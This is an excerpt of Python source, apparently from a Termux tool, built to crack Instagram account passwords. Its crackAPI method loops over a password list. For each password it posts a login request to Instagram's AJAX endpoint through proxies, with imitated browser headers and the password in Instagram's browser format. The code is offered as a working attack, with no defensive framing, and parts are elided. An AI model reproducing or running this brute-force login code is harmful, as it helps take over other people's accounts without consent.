	...
	def crackAPI(self,user,pas):
		...
		try:
			for pw in pas:
				...
				p = ses.get('https://www.instagram.com/accounts/login/?next=/accounts/manage_access/')
				header={
                    'Host':'www.instagram.com',
                    'x-ig-www-claim':'0',
                    'x-instagram-ajax':'d8783024e8db',
                    ...
                    'x-asbd-id':'198387',
                     ...
                     'referer':'https://www.instagram.com/accounts/login/?next=/accounts/manage_access/',
           ...
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			...
			"trustedDeviceRecords": "{}"}
				respon=ses.post("https://www.instagram.com/accounts/login/ajax/", headers = header, data=data, proxies = proxs, allow_redirects = True)
	...
	while True:
		...
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			...
			if key in check.text:
				...
				os.system('xdg-open http://github.com/tahaluindo')
